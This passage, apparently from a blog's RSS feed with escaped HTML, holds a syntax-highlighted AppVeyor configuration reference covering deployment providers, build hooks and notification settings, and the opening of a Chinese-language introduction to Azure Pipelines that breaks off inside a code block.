&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Amazon S3 deployment provider settings&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">S3&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">access_key_id&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ABcd==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secret_access_key&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ABcd==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">bucket&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">my_bucket&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">folder&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">artifact&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">set_public&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Azure Blob storage deployment provider settings&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">AzureBlob&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">storage_account_name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ABcd==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">storage_access_key&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ABcd==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">container&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">my_container&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">folder&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">artifact&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Web Deploy deployment provider settings&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">WebDeploy&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">server&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">http://www.deploy.com/myendpoint&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">website&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">mywebsite&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">username&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">user&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">password&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">eYKZKFkkEvFYWX6NfjZIVw==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">ntlm&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">remove_files&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">app_offline&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">do_not_use_checksum&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># do not use check sum for comparing source and destination files. By default checksums are used.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">sync_retry_attempts&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># sync attempts, max&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">sync_retry_interval&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">2000&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># timeout between sync attempts, milliseconds&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">aspnet_core&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># artifact zip contains ASP.NET Core application&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">aspnet_core_force_restart&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># poke app&amp;#39;s web.config before deploy to force application restart&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">skip_dirs&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">\\App_Data&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">skip_files&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">web.config&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">branch&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">release&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">platform&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">x86&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">configuration&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">debug&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Deploying to Azure Cloud Service&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">AzureCS&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">subscription_id&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">fjZIVw==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">subscription_certificate&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">eYKZKFkkEv...FYWX6NfjZIVw==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">storage_account_name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">my_storage&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">storage_access_key&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ABcd==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">service&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">my_service&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">slot&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Production&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">target_profile&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Cloud&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">artifact&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">MyPackage.cspkg&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Deploying to NuGet feed&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">NuGet&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">server&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://my.nuget.server/feed&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">api_key&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">FYWX6NfjZIVw==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">skip_symbols&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">symbol_server&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://your.symbol.server/feed&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">artifact&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">MyPackage.nupkg&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Deploy to GitHub Releases&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">GitHub&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">artifact&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">/.*\.nupkg/ &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># upload all NuGet packages to release assets&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">draft&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">prerelease&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">branch&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">master &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># release from master branch only&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">APPVEYOR_REPO_TAG&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># deploy on tag push only&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Deploying to a named environment&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Environment&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">staging&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">branch&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">staging&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">env_var1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">value1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">env_var2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">value2&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># scripts to run before deployment&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">before_deploy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># scripts to run after deployment&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">after_deploy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># to run your custom scripts instead of provider deployments&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">deploy_script&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># to disable deployment&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#deploy: off&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># global handlers #&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># on successful build&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">on_success&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">do something&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># on build failure&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">on_failure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">do something&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># after build failure or success&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">on_finish&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">do something&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># notifications #&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">notifications&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Email&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Email&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">to&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">user1@email.com&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">user2@email.com&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">subject&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;Build {{status}}&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># optional&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">message&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;{{message}}, {{commitId}}, ...&amp;#34;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># optional&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">on_build_status_changed&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># HipChat&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">HipChat&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">auth_token&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">RbOnSMSFKYzxzFRrxM1+XA==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">room&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ProjectA&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">template&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;{message}, {commitId}, ...&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Slack&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Slack&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">incoming_webhook&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">http://incoming-webhook-url&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># ...or using auth token&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Slack&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">auth_token&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">kBl9BlxvRMr9liHmnBs14A==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">channel&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">development&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">template&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;{message}, {commitId}, ...&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Campfire&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Campfire&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">account&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">appveyor&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">auth_token&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">RifLRG8Vfyol+sNhj9u2JA==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">room&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ProjectA&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">template&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;{message}, {commitId}, ...&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Webhook&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Webhook&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">url&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">http://www.myhook2.com&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">headers&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">User-Agent&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">myapp 1.0&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">Authorization&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">GhD+5xhLz/tkYY6AO3fcfQ==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">on_build_success&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">on_build_failure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">on_build_status_changed&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Azure Pipelines</title><link>https://sdttttt.github.io/blog/azure_pipelines/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://sdttttt.github.io/blog/azure_pipelines/</guid><description>
&lt;p>Azure Pipelines是一种云服务，可用于自动构建和测试您的代码项目并将其提供给其他用户。它几乎适用于任何语言或项目类型。&lt;/p>
&lt;p>Azure Pipelines将持续集成（CI）和持续交付（CD）相结合，以持续不断地测试和构建您的代码并将其交付给任何目标。&lt;/p>
&lt;p>Azure Pipelines 支持非常多的语言。&lt;/p>
&lt;h4 id="price">Price&lt;/h4>
&lt;p>如果使用公共项目，则Azure Pipelines是免费的。如果您使用私人项目，则每月可以免费运行多达1800分钟（30小时）的管道作业。了解有关基于并行作业定价的更多信息。&lt;/p>
&lt;p>是不是非常的棒呢 o(&lt;em>////▽////&lt;/em>)q&lt;/p>
&lt;p>&lt;strong>请遵循以下基本步骤：&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>配置Azure Pipelines以使用您的Git存储库。&lt;/li>
&lt;li>编辑azure-pipelines.yml文件以定义构建。&lt;/li>
&lt;li>将您的代码推送到版本控制存储库。此操作将启动默认触发器以构建和部署，然后监视结果。&lt;/li>
&lt;/ul>
&lt;h2 id="ruby">Ruby&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
